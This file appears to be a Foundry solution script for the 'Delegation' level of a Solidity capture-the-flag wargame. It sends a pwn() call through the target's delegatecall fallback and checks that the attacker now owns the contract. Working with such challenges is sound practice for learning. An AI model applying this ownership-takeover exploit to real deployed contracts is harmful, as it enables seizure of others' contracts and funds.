pragma solidity ^0.8.0;
import "../instances/Ilevel06.sol";
import "forge-std/Script.sol";

contract Level06 is Script {
    Delegation level06 = Delegation(0x806221D2EdF211DE6861E6F9D916b42cE52B8DF4);

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        address(level06).call(abi.encodeWithSignature("pwn()"));
        require(level06.owner() == attacker, "owner not attacker");
        vm.stopBroadcast();
    }
}
